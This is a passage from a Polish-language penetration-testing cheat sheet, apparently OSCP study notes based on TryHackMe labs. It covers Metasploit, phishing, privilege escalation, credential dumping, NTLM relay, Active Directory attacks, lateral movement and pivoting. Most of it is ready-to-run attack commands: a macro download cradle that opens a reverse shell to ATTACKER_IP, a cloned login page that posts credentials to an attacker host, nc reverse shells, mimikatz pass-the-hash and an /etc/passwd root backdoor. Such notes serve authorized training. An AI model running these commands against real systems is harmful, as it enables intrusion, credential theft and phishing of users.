load kiwi                          # mimikatz wewnątrz meterpretera
download /etc/passwd               # pobierz plik z celu
upload winpeas.exe C:\Temp\        # wgraj na cel
shell                              # zejście do natywnego shella
background                         # (Ctrl+Z) → wróć do msf, sesja żyje
```
```
sessions -l                        # lista sesji
sessions -i 2                      # wejdź do sesji 2
sessions -u 1                      # UPGRADE zwykłego shella → meterpreter
```
### Local exploity / bypass UAC
```
search UAC
use exploit/windows/local/bypassuac_sdclt
set SESSION 1
run
```
### Pivoting przez MSF (autoroute + SOCKS)
```
use post/multi/manage/autoroute    # dodaj trasy do wewn. podsieci przez sesję
set session 1
run                                # ręcznie: route add 172.16.5.0/24 1
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set VERSION 5
run -j                             # SOCKS5 na 127.0.0.1:1080 → proxychains
```
### Resource scripts (automatyzacja)
```bash
msfconsole -r handler.rc           # uruchom komendy z pliku (.rc)
# w konsoli: makerc /tmp/setup.rc   # zapisz historię komend jako skrypt
```

## 2.14 Client-side attacks & phishing (koncepcja)

> ⚠️ Tylko w ramach **autoryzowanego** zaangażowania / labu. Cel: skłonić UŻYTKOWNIKA do uruchomienia kodu, gdy nie ma podatnej usługi sieciowej. Wektory: dokumenty z makrami, pliki HTA/LNK, sfałszowane strony logowania.

### Fingerprinting klienta
```bash
exiftool -a -u brochure.pdf         # metadane pliku → wersje software'u ofiary
# Serwuj stronę-pułapkę i czytaj User-Agent z logów, by dobrać exploit do przeglądarki/OS.
```
### Makro Office (VBA) — download & execute
> Szkielet: `Sub AutoOpen()` / `Sub Document_Open()` odpalają makro przy otwarciu pliku `.docm`. Makro uruchamia PowerShell z **download-cradle** (pobierz skrypt z Kali i wykonaj w pamięci):
```powershell
IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKER_IP/powercat.ps1'); powercat -c ATTACKER_IP -p 4444 -e powershell
```
> Analiza podejrzanych makr (blue-team / weryfikacja): `olevba dokument.docm`.

### Dostawa payloadu przez WebDAV / HTTP
```bash
sudo apt install python3-wsgidav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/   # share WebDAV
python3 -m http.server 80            # albo zwykły HTTP do download-cradle
nc -nvlp 4444                        # listener na reverse shell
```
### Phishing poświadczeń (koncepcja)
> Sklonuj stronę logowania, podmień `action` formularza na własny serwer, hostuj, zbieraj wpisane dane:
```bash
wget -E -k -K -p -e robots=off -nd "https://przyklad.com/signin"    # zapisz stronę + zasoby
single-file "https://przyklad.com/signin" signin.html \
  --browser-executable-path /usr/bin/chromium                       # wierniejsza kopia SPA
# w signin.html: <form action="http://ATTACKER_IP:8080/creds" method="POST">
sudo python3 -m http.server 80       # hostuj klon; własny cred_server.py loguje POST /creds
```
> Wariant bez klonu: wymuś uwierzytelnienie NTLM (odwołanie do `\\ATTACKER_IP\share` w mailu/pliku) i przechwyć hash Responderem (§5.4). Zawsze w granicach zgody klienta.

---

# 3. Post-Exploitation — Situational Awareness

> Cel fazy: „gdzie jestem, kim jestem, co widzę”. Automatyzuj (linpeas/winpeas), ale rozumiej ręczne komendy.

## 3.1 Linux — rozpoznanie lokalne

### Automat (najpierw to)
```bash
# Serwuj z Kali: python3 -m http.server 8000 ; potem na ofierze:
curl http://$LHOST:8000/linpeas.sh | sh
# alternatywy: pspy (podgląd procesów/cronów bez roota), LinEnum.sh
```

### System
```bash
cat /etc/issue; cat /etc/*-release; uname -a        # dystrybucja + wersja kernela
ls -lah /home/*                                      # kto ma home i jakie permisje
```
### Procesy
```bash
ps aux                                               # a,x = wszystkie; u = czytelnie
watch -n 1 "ps -aux | grep pass"                     # łap procesy zawierające 'pass'
```
### Sieć
```bash
route; routel                                         # tablice routingu
ss -anp                                               # połączenia: -a wszystkie, -n bez DNS, -p proces
sudo tcpdump -i lo -A | grep "pass"                   # podsłuch loopbacka, filtr 'pass'
```
### Firewall / Cron / Aplikacje
```bash
cat /etc/iptables/*                                   # reguły (Debian iptables-persistent)
ls -lah /etc/cron*                                    # zadania cron
cat /etc/crontab                                      # admini często dopisują tu joby jako root!
crontab -l                                            # zadania bieżącego usera
sudo crontab -l                                       # zadania root (jeśli sudo)
grep "CRON" /var/log/syslog                           # historia wykonań cron
dpkg -l                                               # zainstalowane pakiety (Debian)
```
### User trails (ślady poświadczeń)
```bash
env                                                   # zmienne środowiskowe (czasem hasła!)
cat ~/.bashrc                                         # trwałe zmienne (np. SCRIPT_CREDENTIALS)
cat ~/.bash_history                                   # historia poleceń
grep -rniE "password|passwd|secret|api_key" /var/www /home /etc 2>/dev/null
```
### Mounty i dyski
```bash
mount; cat /etc/fstab; lsblk                          # zamontowane / montowane przy boocie / dyski
```
### Kernel modules
```bash
lsmod                                                 # załadowane moduły
/sbin/modinfo libata                                  # szczegóły modułu (wymaga pełnej ścieżki)
```

## 3.2 Windows — rozpoznanie lokalne

### Automat
```powershell
# winPEAS.exe / winPEASany.exe  |  PowerUp.ps1 (Invoke-AllChecks)  |  Seatbelt.exe
.\winPEASx64.exe
```

### Kto i gdzie (użytkownik, host, uprawnienia)
```cmd
whoami                          :: domena\użytkownik
whoami /groups                  :: grupy (klucz do szukania uprawnień admina)
whoami /priv                    :: uprawnienia (SeImpersonate, SeBackup itd. → privesc!)
whoami /all                     :: wszystko naraz
hostname
net user <username>             :: szczegóły konkretnego konta
```
### Konta i grupy
```cmd
net user                        :: lokalni użytkownicy   (PS: Get-LocalUser)
net localgroup                  :: lokalne grupy         (PS: Get-LocalGroup)
net localgroup Administrators   :: kto ma admina         (PS: Get-LocalGroupMember Administrators)
```
### Uruchamianie jako inny user
```powershell
runas /user:dave powershell
Start-Process powershell -Verb runAs
```
### System operacyjny
```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic os get Caption, OSArchitecture, Version
```
### Sieć
```cmd
ipconfig /all                   :: pełna konfiguracja kart
netstat -ano                    :: połączenia + PID
arp -a                          :: tablica ARP (świetne do pivotingu — kto jest w LAN)
route print                     :: tablica routingu
```
### Oprogramowanie
```cmd
wmic product get name, version
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr /i "displayname"
:: PS (szybsze niż wmic):
powershell "Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion"
```
### Procesy
```cmd
tasklist /v                     :: /v pokazuje na jakim koncie działa proces
powershell Get-Process
```
### Szukanie plików i historii
```powershell
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.kdbx,*.config -File -Recurse -ErrorAction SilentlyContinue
# Historia PowerShell (częsty jackpot z hasłami):
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# Szukanie haseł w plikach:
findstr /si password *.txt *.ini *.config *.xml
```

---

# 4. Privilege Escalation (Eskalacja uprawnień)

> Cel fazy: z usera → root/SYSTEM. Najpierw automat (linpeas/winpeas), potem ręczna weryfikacja tropów.
> 🔗 **GTFOBins** (Linux): https://gtfobins.github.io  |  **LOLBAS** (Windows): https://lolbas-project.github.io

## 4.1 Linux privesc

### SUID / SGID binaries
> Bit SUID (`s` zamiast `x`) pozwala uruchomić plik z prawami **właściciela**.
```bash
find / -perm -u=s -type f 2>/dev/null                 # znajdź SUID
find / -perm -g=s -type f 2>/dev/null                 # znajdź SGID
```
Jeśli np. `find` ma SUID → wykonaj polecenie jako root:
```bash
find /home/joe/Desktop -exec "/usr/bin/bash" -p \;
```
> Dla każdego nietypowego SUID-a sprawdź **GTFOBins** → sekcja "SUID".

### Sudo
```bash
sudo -l                                                # co user może uruchomić jako root/inny
```
Przykład: `(ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get` → sprawdź każdy w GTFOBins ("Sudo").
> ⚠️ Uważaj na AppArmor — komenda z sudo może być blokowana profilem:
```bash
cat /var/log/syslog | grep tcpdump                     # szukaj apparmor="DENIED"
su - root; aa-status                                   # co AppArmor chroni
```
Sudo bez hasła + `LD_PRELOAD`/`env_keep`, stare CVE (Baron Samedit `sudo -V`), itp. — patrz GTFOBins.

### Capabilities
> Uprawnienia nadawane binarkom bez pełnego SUID. `cap_setuid+ep` = można zostać rootem.
```bash
/usr/sbin/getcap -r / 2>/dev/null
```
```
/usr/bin/perl = cap_setuid+ep          <- jackpot
```
```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

### Cron jobs z błędnymi uprawnieniami
```bash
grep "CRON" /var/log/syslog
ls -lah /etc/cron*
cat /etc/crontab
# Jeśli skrypt uruchamiany przez root-cron jest zapisywalny → wstrzyknij reverse shell.
```
Znajdź katalogi/pliki zapisywalne przez usera:
```bash
find / -writable -type d 2>/dev/null                   # zapisywalne katalogi
find / -writable -type f 2>/dev/null | grep -v /proc    # zapisywalne pliki
```

### Zapisywalny /etc/passwd (nadpisanie hasła root)
> Jeśli hash jest w 2. kolumnie /etc/passwd, ma pierwszeństwo przed /etc/shadow.
```bash
openssl passwd w00t                                    # wygeneruj hash crypt
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
su root2                                               # hasło: w00t
```

### Inne szybkie tropy
```bash
sudo -l                                                # zawsze najpierw
find / -perm -u=s -type f 2>/dev/null                  # SUID
getcap -r / 2>/dev/null                                # capabilities
# Kernel exploity: uname -r  → szukaj (np. DirtyCow, DirtyPipe, PwnKit/CVE-2021-4034)
```

## 4.2 Windows privesc

### Uprzywilejowane tokeny (whoami /priv)
> Jeśli masz któreś z tych → droga do SYSTEM:
| Privilege | Wykorzystanie |
|-----------|---------------|
| **SeImpersonatePrivilege** | Ataki „potato” (PrintSpoofer/GodPotato/JuicyPotato) — impersonacja SYSTEM |
| **SeAssignPrimaryTokenPrivilege** | j.w., w parze z SeImpersonate |
| **SeBackupPrivilege** | Czytanie dowolnego pliku → dump SAM/SYSTEM hive |
| **SeRestorePrivilege** | Zapis dowolnego pliku/klucza rejestru |
| **SeDebugPrivilege** | Podpięcie debuggera → dump LSASS, injection |
```
whoami /all
systeminfo
set
```
**Potato (SeImpersonate) — najczęstszy przypadek z konta serwisowego:**
```cmd
PrintSpoofer64.exe -i -c cmd                            :: Win10/Server 2016-2019
GodPotato -cmd "cmd /c whoami"                          :: nowsze systemy
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t *
```

### Service hijacking (słabe uprawnienia usług)
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like 'mysql'}
# Sprawdź uprawnienia binarki usługi (czy możesz nadpisać):  icacls "C:\Path\service.exe"
```

### Unquoted Service Paths
> Ścieżka usługi bez cudzysłowów + spacja → Windows próbuje uruchomić `C:\Program.exe` itd.
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName
```
```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

### DLL Hijacking
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select DisplayName, InstallLocation
```
> Użyj **Process Monitor** (filtr: Result = NAME NOT FOUND, Path kończy się na .dll) żeby znaleźć DLL ładowany z zapisywalnej ścieżki.

### Registry — auto-logon i sekrety
```cmd
:: Auto-logon credentials (sprawdź DefaultPassword + AutoAdminLogon=1)
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
:: Zainstalowane apps
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
:: Szukanie 'password' w całym rejestrze
reg query HKLM /f "password" /t REG_SZ /s
```

### Scheduled Tasks
```cmd
schtasks /query /fo LIST /v                             :: lista zadań (szukaj tych jako SYSTEM z zapisywalną akcją)
:: Tworzenie zdalne (wymaga uprawnień):
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<payload>" /sc ONCE /sd 01/01/1970 /st 00:00
schtasks /s TARGET /run /TN "THMtask1"
schtasks /S TARGET /TN "THMtask1" /DELETE /F
```

---

# 5. Credential Access (Pozyskiwanie poświadczeń)

## 5.1 Łamanie hashy

### John the Ripper
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
john --show hashes.txt                                  # pokaż złamane
# Automatyczne rozpoznanie typu: john potrafi zgadnąć, ale przy AD zwykle podajesz format ręcznie
```
### Hashcat (szybszy, GPU)
```bash
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt    # -m = typ hasha
```
| `-m` | Typ |
|------|-----|
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM |
| 1800 | sha512crypt (/etc/shadow) |
| 3200 | bcrypt |
| 5600 | NetNTLMv2 (Responder) |
| 13100 | Kerberoast (TGS-REP) |
| 18200 | AS-REP Roast |
```bash
hashcat --example-hashes | grep -iA2 "ntlm"             # gdy nie znasz numeru -m
```
> Identyfikacja typu hasha przed łamaniem: `hashid '<hash>'` lub `nth --text '<hash>'`.

### Ekstrakcja hasha z pliku (`*2john`)
```bash
ssh2john id_rsa > ssh.hash             # zaszyfrowany klucz prywatny SSH → hash
keepass2john Database.kdbx > kp.hash   # baza KeePass → hash
zip2john plik.zip > zip.hash           # (analogicznie: office2john, gpg2john, pdf2john)
hashcat -m 22921 ssh.hash /usr/share/wordlists/rockyou.txt -r ssh.rule   # klucz SSH
hashcat -m 13400 kp.hash  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule   # KeePass
```
> Dodatkowe tryby `-m`: **13400** KeePass · **22921** klucz SSH · **11600** 7-Zip · **13600** ZIP · **9600** Office 2013+ · **7500** Kerberos AS-REQ (etype 23).

### Password spraying (1 hasło × wielu userów)
```bash
crackmapexec smb $DC -u users.txt -p 'Sezon2024!' -d $DOMAIN --continue-on-success   # nxc = następca cme
kerbrute passwordspray -d $DOMAIN users.txt 'Sezon2024!'          # przez Kerberos (ciszej)
```
> ⚠️ Uwaga na **lockout policy** — spray JEDNYM hasłem na rundę, z przerwami. Mutacje list haseł: `hashcat --stdout wordlist.txt -r best64.rule` albo `kwp` (kwprocessor, maski klawiaturowe).

## 5.2 Mimikatz (Windows, wymaga admina/SYSTEM)

### Dump NTLM z lokalnego SAM
```
mimikatz
privilege::debug
token::elevate
lsadump::sam
```
### Dump NTLM z pamięci LSASS
```
privilege::debug
token::elevate
sekurlsa::msv
```
### Klucze Kerberos (do Pass-the-Key)
```
privilege::debug
sekurlsa::ekeys
```
### DCSync (wyciągnij hash dowolnego usera z DC — wymaga uprawnień replikacji)
```
lsadump::dcsync /domain:za.tryhackme.com /user:Administrator
```
### memssp (SSP backdoor — zapis plaintext haseł przy logowaniu)
```
privilege::debug
misc::memssp
```

### secretsdump (Linux/impacket — alternatywa bez wchodzenia na hosta)
```bash
impacket-secretsdump $DOMAIN/user:password@$IP           # zdalny dump SAM+LSA+NTDS
impacket-secretsdump -just-dc $DOMAIN/user:password@$DC   # DCSync przez sieć (całe NTDS.dit)
```

## 5.3 Kerberos

### AS-REP Roasting (Linux — patrz też §1.8)
```bash
impacket-GetNPUsers $DOMAIN/ -dc-ip $DC -usersfile users.txt -format hashcat -outputfile asrep.txt -no-pass
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```
### Kerberoasting (konta z SPN — wymaga dowolnych poprawnych creds)
```bash
impacket-GetUserSPNs $DOMAIN/user:password -dc-ip $DC -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```
### Rubeus (Windows)
```
Rubeus.exe asreproast
Rubeus.exe kerberoast
```

## 5.4 Responder — LLMNR / NBT-NS / mDNS poisoning

> **Idea:** gdy Windows nie rozwiąże nazwy przez DNS, rozgłasza zapytanie **LLMNR/NBT-NS** do całej podsieci ("gdzie jest \\fileserver?"). Responder odpowiada „to ja!", ofiara próbuje się uwierzytelnić i **wysyła Ci NetNTLMv2 hash**. Klasyk na wejściu do sieci wewnętrznej, gdy nie masz jeszcze żadnych poświadczeń.

```bash
# Nasłuchuj i truj na interfejsie tunelowym/lan (uruchom NA POCZĄTKU, działa w tle):
sudo responder -I eth0 -dwv
# -I interfejs | -d odpowiadaj na NBT-NS domenowe | -w serwer WPAD | -v verbose
```
Złapane hashe lądują w logu + na ekranie (format hashcat):
```bash
ls -la /usr/share/responder/logs/
hashcat -m 5600 netntlmv2.txt /usr/share/wordlists/rockyou.txt   # 5600 = NetNTLMv2
```
> 💡 **NetNTLMv2 hash da się łamać, ale NIE da się nim robić pass-the-hash.** Jeśli hasło jest mocne i nie łamie się → przekaż go dalej relayem (§5.5).

**Wymuszenie uwierzytelnienia** (nie czekaj, aż ktoś sam się pomyli — sprowokuj):
```bash
# Jeśli masz już niski shell/dostęp do share: wskaż ofierze plik na Twoim hoscie
# (ikona/plik na share, e-mail, itp.) - dowolne odwołanie do \\ATTACKER\x wyśle hash.
# Narzędzia: ntlm_theft (generuje .lnk/.scf/.url), lub wstrzyknięcie ścieżki UNC do formularza.
```
> ⚠️ **Egzamin/produkcja:** przed relayem **WYŁĄCZ** wbudowane serwery SMB i HTTP Respondera w `/etc/responder/Responder.conf` (`SMB = Off`, `HTTP = Off`), bo inaczej zajmą porty, których potrzebuje `ntlmrelayx`.

## 5.5 NTLM Relay (ntlmrelayx) — przekazanie zamiast łamania

> **Idea:** zamiast łamać złapany hash, **przekaż uwierzytelnienie w locie** do innej maszyny i wykonaj tam akcję z uprawnieniami ofiary. Warunek: **SMB signing = disabled/not required** na celu (sprawdź niżej). To najczęstsza droga z „mam hash, ale się nie łamie" do shella/creds.

**Krok 0 — znajdź cele bez SMB signing:**
```bash
crackmapexec smb 10.10.10.0/24 --gen-relay-list targets.txt   # zapisze hosty z signing:False
# lub: nmap --script smb2-security-mode -p445 10.10.10.0/24
```
**Krok 1 — Responder truje, ale bez własnego SMB/HTTP** (patrz warning wyżej).

**Krok 2 — ntlmrelayx łapie i przekazuje:**
```bash
# Dump SAM/hashy na celu (gdy relayowany user jest tam lokalnym adminem):
impacket-ntlmrelayx -tf targets.txt -smb2support

# Interaktywny SMB client po udanym relayu (-i → łączysz się przez nc 127.0.0.1 <port>):
impacket-ntlmrelayx -tf targets.txt -smb2support -i

# Odpal komendę / reverse shell na celu:
impacket-ntlmrelayx -t smb://VICTIM_IP -smb2support -c 'powershell -enc <BASE64_REVSHELL>'

# Relay do LDAP na DC → np. dodanie komputera / RBCD / dump domeny:
impacket-ntlmrelayx -t ldap://$DC --escalate-user twoj_user
```
> 🎯 **Killer combo (OSCP AD):** wymuś auth konta maszynowego/admina (Responder / PetitPotam / PrinterBug) → relay do **LDAPS na DC** → skonfiguruj **RBCD** albo **Shadow Credentials** → uzyskaj TGT jako DA. Alternatywnie relay SMB → `--dump-laps` / secretsdump.

**Powiązane techniki wymuszania auth (coercion):**
```bash
python3 PetitPotam.py -u user -p pass $LHOST $DC      # MS-EFSRPC coercion
python3 printerbug.py $DOMAIN/user:pass@$DC $LHOST     # MS-RPRN (spooler) coercion
coercer coerce -u user -p pass -t $DC -l $LHOST        # zbiorczy coercer
```

> **Mapa decyzji (mam NetNTLMv2 hash — co dalej?):**
> 1. Spróbuj złamać: `hashcat -m 5600` → jak pęknie, masz plaintext (używaj wszędzie).
> 2. Nie pęka? → **relay** (§5.5), o ile cel ma SMB signing off.
> 3. Signing wszędzie on i hash mocny? → wróć do innych wektorów (Kerberoast, misconfig, web).

---

# 6. Active Directory

> 🔗 Setup BloodHound graph: https://happycamper84.medium.com/howto-setup-bloodhound-map-ad-44c7149ba28b
> 🔗 PowerSploit/PowerView: https://github.com/PowerShellMafia/PowerSploit

## 6.1 Zbieranie danych — SharpHound / BloodHound

**SharpHound.exe** — kolektor na hoście domenowym (Windows):
```
.\SharpHound.exe --CollectionMethods All --Domain tryhackme.loc --ExcludeDCs
```
**bloodhound-python** — kolektor z Linuxa (potrzeba poświadczeń):
```bash
bloodhound-python -u asrepuser1 -p 'qwerty123!' -d $DOMAIN -ns $DC -c All --zip
```
Uruchomienie GUI (import ZIP-a przez drag&drop):
```bash
sudo neo4j start                    # baza (login http://localhost:7474, domyślny user neo4j)
bloodhound                          # aplikacja GUI
# stop: sudo neo4j stop
```
**Co analizować w BloodHound** dla wybranego obiektu:
- *Object information* — nazwa, typ, domena
- *Sessions* — aktywne sesje logowania
- *Member of* — członkostwo w grupach
- *Local admin privileges* — gdzie jest lokalnym adminem
- *Execution privileges* — RDP/PSRemote
- *Outbound/Inbound object control* — prawa nad innymi obiektami i odwrotnie
- **Prebuilt queries** → "Shortest Path to Domain Admins" = złota ścieżka

## 6.2 Enumeracja PowerShell (PowerView + moduł AD)

```powershell
Import-Module .\PowerView.ps1
Get-Module -ListAvailable ActiveDirectory       # czy jest moduł AD
Import-Module ActiveDirectory
```
Moduł ActiveDirectory:
```powershell
Get-ADUser -Filter *                              # wszyscy użytkownicy
Get-ADUser -Identity <username> -Properties *     # szczegóły usera
Get-ADUser -Filter "Name -like '*admin*'"         # konta 'admin'
Get-ADGroup -Filter *                             # grupy
Get-ADGroupMember -Identity "Group Name"          # członkowie grupy
Get-ADComputer -Filter *                          # komputery
Get-ADDefaultDomainPasswordPolicy                 # polityka haseł
```
PowerView (mocniejsze do ataku):
```powershell
Get-NetUser | select samaccountname
Get-NetGroup "Domain Admins" -MemberIdentity
Find-LocalAdminAccess                             # gdzie jestem lokalnym adminem
Invoke-Kerberoast                                 # SPN roasting z Windows
Get-NetGPO; Get-DomainPolicy
```

### Grupy warte uwagi
> Domain Admins / Administrators = klucze do całego AD. Enterprise Admins = multi-domain forest.
> Server Operators, Backup Operators = uprzywilejowane wbudowane. Cokolwiek z "Admin" w nazwie (np. "SQL Admins").

## 6.3 net / wmic (cmd)

```cmd
net user /domain                 :: userzy domeny (bez /domain = lokalni)
net user <username> /domain      :: info o userze domeny
net group /domain                :: grupy domeny
net group "Group Name" /domain   :: członkowie grupy
net localgroup                   :: grupy lokalne
net localgroup Administrators    :: lokalni admini
query user                       :: zalogowane sesje (alias quser)
tasklist /V                      :: procesy + konta
net session                      :: sesje SMB
net view \\dc01 /all             :: share'y na hoscie
```
WMIC — usługi i konta serwisowe (szukaj DomainName\username → reużycie creds):
```cmd
wmic service get Name,StartName
:: PS: Get-WmiObject Win32_Service | select Name, StartName
```

## 6.4 MSSQL w AD (patrz też §2.1)
```bash
impacket-mssqlclient Administrator:Lab123@$IP -windows-auth
```

---

# 7. Lateral Movement (Ruch boczny)

> Cel fazy: z jednego hosta na kolejny, zwykle z pozyskanymi poświadczeniami/hashem.
> **Najpierw** przygotuj payload (§2.4), potem użyj metody uruchomienia zdalnego poniżej.

## 7.1 Zdalne wykonanie z poświadczeniami

### PsExec (445/TCP SMB, grupa Administrators)
```cmd
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```
### WinRM (5985/5986, grupa Remote Management Users)
```cmd
winrs.exe -u:Administrator -p:Mypass123 -r:target cmd
```
Z Linuxa (evil-winrm — mój ulubiony do foothold na AD):
```bash
evil-winrm -i $IP -u Administrator -p 'Mypass123'
evil-winrm -i $IP -u Administrator -H <NTLM_HASH>        # pass-the-hash
```
### sc.exe — usługi zdalne (135/445/139, Administrators)
```cmd
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
sc.exe \\TARGET stop THMservice
sc.exe \\TARGET delete THMservice
```
> ⚠️ Spacja po `binPath=` i `start=` jest wymagana (składnia sc).

**Pełny łańcuch sc z payloadem (przykład z modułu):**
```bash
# 1. Payload service EXE
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=$LHOST LPORT=4444 -o myservice.exe
# 2. Upload na admin$
smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
# 3. Listener (msfconsole: use exploit/multi/handler; set LHOST; exploit)  +  nc -lvnp 4443
# 4. runas z creds na pierwszej maszynie:
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
# 5. Odpal usługę na nowym hoscie:
sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
```

### WMI + MSI (135/5985, Administrators)
```bash
# 1. Payload MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f msi > myinstaller.msi
# 2. Upload
smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
```
Na hoscie (PowerShell) — sesja WMI i instalacja:
```powershell
$username = 't1_corine.waters';
$password = 'Korine.1994';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
```

### impacket (Linux → Windows, jeden z najczęstszych)
```bash
impacket-psexec $DOMAIN/user:password@$IP           # SYSTEM shell
impacket-wmiexec $DOMAIN/user:password@$IP          # cichszy (bez usługi)
impacket-smbexec $DOMAIN/user:password@$IP
impacket-atexec $DOMAIN/user:password@$IP whoami    # przez scheduled task
```

## 7.2 Pass-the-Hash / Ticket / Key

### Pass-the-Hash (NTLM)
```
mimikatz
token::revert
sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe 10.150.74.13 4444"
```
Z Linuxa:
```bash
xfreerdp /v:$IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
impacket-psexec -hashes :NTLM_HASH DOMAIN/MyUser@$IP
evil-winrm -i $IP -u MyUser -H NTLM_HASH
crackmapexec smb $IP -u MyUser -H NTLM_HASH
```

### Pass-the-Ticket (Kerberos .kirbi)
```
mimikatz
privilege::debug
sekurlsa::tickets /export
kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```

### Pass-the-Key (z ekeys)
```
mimikatz
privilege::debug
sekurlsa::ekeys
```
```
:: RC4
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
:: AES128
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"..."
:: AES256
sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"..."
```

## 7.3 RDP hijacking (SYSTEM, Server 2016 i starsze)
> Sesja RDP zamknięta bez wylogowania zostaje otwarta — z SYSTEM przejmiesz ją bez hasła.
```cmd
PsExec64.exe -s cmd.exe                 :: uzyskaj SYSTEM
query user                              :: znajdź sesje (stan Disc = porzucona)
tscon 3 /dest:rdp-tcp#6                 :: przejmij sesję ID 3 na swoją SESSIONNAME
```

---

# 8. Pivoting & Port Forwarding

> Scenariusz w przykładach: `1.1.1.1` = atakujący (SSH server), `2.2.2.2` = PC-1 (pivot, SSH client), `3.3.3.3` = cel wewnętrzny.

## 8.1 SSH tunneling

Przygotowanie usera do tunelu (na maszynie atakującej):
```bash
useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser
```
### Remote Port Forwarding (`-R`) — wystaw port celu na SWOJEJ maszynie
> Na PC-1 (ma dostęp do portu 3389 celu), pchamy go do nas:
```bash
# na PC-1:
ssh tunneluser@ATTACKER_IP -R 3389:SERVER_IP:3389 -N
# u nas:
xfreerdp /v:127.0.0.1 /u:MyUser /p:MyPassword
```
### Local Port Forwarding (`-L`) — wciągnij port z naszej maszyny na PC-1
```bash
# na PC-1: udostępnij nasz port 80 lokalnie na PC-1
ssh tunneluser@1.1.1.1 -L *:80:127.0.0.1:80 -N
# firewall na PC-1 (jeśli trzeba, wymaga admina):
netsh advfirewall firewall add rule name="Open Port 80" dir=in action=allow protocol=TCP localport=80
```
### Dynamic Port Forwarding + SOCKS (`-R 9050`) — skanuj całą podsieć przez pivot
```bash
# na PC-1 (reverse dynamic — nie wymaga SSH servera na Windzie):
ssh tunneluser@1.1.1.1 -R 9050 -N
# SSH server startuje SOCKS na 9050. Skonfiguruj /etc/proxychains.conf (socks 127.0.0.1 9050), potem:
proxychains curl http://pxeboot.za.tryhackme.com
proxychains nmap -sT -Pn 3.3.3.3
```

## 8.2 socat (gdy nie ma SSH)
```bash
# Na PC-1: otwórz 3389 i przekieruj na cel
socat TCP4-LISTEN:3389,fork TCP4:3.3.3.3:3389
# Na PC-1: wystaw nasz port 80 dla celu
socat TCP4-LISTEN:80,fork TCP4:1.1.1.1:80
# firewall (Windows pivot):
netsh advfirewall firewall add rule name="Open Port 3389" dir=in action=allow protocol=TCP localport=3389
```
> socat nie łączy się bezpośrednio do atakującego jak SSH — otwiera port na pivocie, do którego się dopinasz.

## 8.3 chisel (nowoczesny, gdy socat/SSH odpadają — świetny na Windę)
```bash
